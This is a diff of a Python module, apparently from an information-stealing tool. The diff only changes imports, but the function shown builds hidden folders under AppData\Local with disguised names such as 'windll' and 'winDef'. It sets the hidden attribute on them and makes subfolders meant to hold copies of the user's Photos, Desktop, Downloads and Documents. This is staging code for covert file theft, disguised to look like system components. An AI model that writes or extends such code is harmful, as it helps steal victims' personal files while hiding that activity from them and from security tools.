@@ -12,7 +12,7 @@
 """
 All imports
 """
-import os
+from os import environ, sep, path, makedirs
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32api import SetFileAttributes
 
@@ -21,18 +21,18 @@ from win32api import SetFileAttributes
 Makes all needed directories
 """
 def makeFolders(fileGrab,startOne):
-    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-    if os.path.exists(rf'{pathf}\windll'):
+    pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
+    if path.exists(rf'{pathf}\windll'):
         print('none')
     else:
         if startOne:
-            os.makedirs(rf'{pathf}\system\sysFiles\winDef')
+            makedirs(rf'{pathf}\system\sysFiles\winDef')
             open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
-        os.makedirs(rf'{pathf}\windll\System')
+        makedirs(rf'{pathf}\windll\System')
         SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
-        os.makedirs(rf'{pathf}\windll\Photos')
+        makedirs(rf'{pathf}\windll\Photos')
         if not fileGrab:
-            os.makedirs(rf'{pathf}\windll\DocumentFiles\Desktop')
-            os.makedirs(rf'{pathf}\windll\DocumentFiles\Downloads')
-            os.makedirs(rf'{pathf}\windll\DocumentFiles\Documents')
+            makedirs(rf'{pathf}\windll\DocumentFiles\Desktop')
+            makedirs(rf'{pathf}\windll\DocumentFiles\Downloads')
+            makedirs(rf'{pathf}\windll\DocumentFiles\Documents')
 
